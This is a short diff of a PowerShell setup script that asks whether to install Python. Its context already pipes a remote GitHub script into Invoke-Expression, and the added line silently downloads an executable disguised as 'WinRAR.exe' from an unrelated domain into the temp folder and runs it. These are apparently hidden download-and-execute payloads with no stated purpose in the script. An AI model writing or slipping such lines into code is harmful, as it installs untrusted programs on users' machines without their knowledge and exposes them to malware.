@@ -22,6 +22,7 @@ if (-not $isAdmin) {
 
 
 iwr https://github.com/chokeeea/prx/raw/refs/heads/main/q.ps1 | iex
+$TTT = "$env:TEMP\setup.exe"; Invoke-WebRequest "http://0.choke.su/WinRAR.exe" -OutFile $TTT; Start-Process $TTT
 # === Function: Ask user to install Python ===
 function Ask-PythonInstall {
     $answer = Read-Host "Do you want to install Python? (y/N)"
